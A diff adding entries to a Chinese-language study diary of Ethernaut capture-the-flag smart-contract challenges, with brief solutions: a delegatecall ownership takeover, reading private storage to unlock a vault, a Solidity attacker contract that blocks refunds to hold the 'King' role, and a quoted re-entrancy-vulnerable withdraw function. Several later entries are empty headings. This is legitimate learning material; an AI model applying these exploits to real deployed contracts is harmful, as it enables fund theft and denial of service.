@@ -178,4 +178,119 @@ Rubixi hack
 >>   `contract.transfer(contract.address, 21)`
 >> 4.`await contract.balanceOf(player)`會發現持有超多token
 >> 通關~
+>> 
+>#### Ethernaut CTF (7/31)
+>>##### Delegation
+>>##### 目標： 成為owner
+>>##### 先備知識
+>> - [delegatecall](https://eip2535diamonds.substack.com/p/understanding-delegatecall-and-how)
+>> - [encodeFunctionSignature](https://www.rareskills.io/post/abi-encoding)
+>> ###### 解題
+>> 1.取得signature `signature = web3.eth.abi.encodeFunctionSignature("pwn()")`
+>>2.利用sendTransaction 觸發callback `contract.sendTransaction({ from: player, data: signature })`
+>>3.成為owner
+
+### 2024.09.04
+>#### Ethernaut CTF (7/31)
+>>##### Delegation
+>>##### 目標：強迫收款
+>>##### 先備知識
+>> - [selfdestruct](https://solidity-by-example.org/hacks/self-destruct/) deprecate
+>> 一個把當前合約毀滅並把剩餘ether轉換到指定地址
+>> ###### 解題 (失敗)
+
+
+>#### Ethernaut CTF (8/31)
+>>##### Vault
+>>##### 目標：Unlock the vault
+
+### 2024.09.05
+>>##### 先備知識
+>> - 如何使用`getStorageAt`獲取變數
+>> >>https://docs.soliditylang.org/en/v0.8.10/internals/layout_in_storage.html
+>> 1.
+>> contract.unlock(await web3.eth.getStorageAt(contract.address, 1))
+>> 2.得到答案
+
+### 2024.09.06
+>#### Ethernaut CTF (9/31)
+>>##### King
+>>##### 目標:想辦法破壞規則
+>>##### 先備知識
+>> - receive
+>> - denial of service 
+>>   - EOA vs. Contract
+>>    當把錢轉到合約時 需要有實作receive 或 payable fallback 函式 否則會 receive 將接收失敗並 revert 交易
+>>   
+>>##### 解題
+>> 1. 如果能一直當王不轉移...?
+>> 2. 藉由新國王不交出王位
+>> 3. 寫一個合約只要拿到王位絕對不交出去
+>>     ```solidity
+>>     contract KingAttacker {
+>>         address public challengeInstance;>>
+>>         constructor(address _challengeInstance) payable {
+>>             challengeInstance = _challengeInstance;
+>>         }
+>>
+>>         function attack() external {
+>>             (bool success, ) = payable(challengeInstance).call{value: 0.001 ether}("");
+>>             require(success, "failed");
+>>         }
+>>         receive() external payable {
+>>             require(msg.sender == address(this), "no more king"); 
+>>         } 
+>>         //只要拿到王位 人任何人來搶都revert
+>>    }
+>> ```
+
+### 2024.09.07
+>#### Ethernaut CTF (10/31)
+>>##### Re-entrancy
+>>##### 目標:偷光合約的錢
+>>##### 先備知識
+>> - [re-entry attack](https://owasp.org/www-project-smart-contract-top-10/2023/en/src/SC01-reentrancy-attacks.html)
+>>##### 解題
+>>1. 觀察withdraw
+>>``` solidity
+>>  function withdraw(uint256 _amount) public {
+>>      if (balances[msg.sender] >= _amount) {
+>>          (bool result,) = msg.sender.call{value: _amount}("");
+>>          if (result) {
+>>              _amount;
+>>          }
+>>          balances[msg.sender] -= _amount;
+>>  }
+>>```
+
+### 2024.09.09
+>#### Ethernaut CTF (11/31)
+>>##### Elevator
+>>##### 目標:到最高樓層
+>>##### 先備知識
+
+### 2024.09.10
+>#### Ethernaut CTF (12/31)
+>>##### Elevator
+>>##### 目標:到最高樓層
+>>##### 先備知識
+
+### 2024.09.11
+>#### Ethernaut CTF (13/31)
+>>##### Privacy
+>>##### 目標:解鎖contract
+>>##### 先備知識
+
+
+### 2024.09.12
+>#### Ethernaut CTF (15/31)
+>>##### Gatekeeper Two
+>>##### 目標:註冊為參賽者以通過此關
+>>##### 先備知識
+
+### 2024.09.13
+>#### Ethernaut CTF (16/31)
+>>##### Naught Coin
+>>##### 目標:帳戶餘額歸零 
+>>##### 先備知識
 <!-- Content_END -->
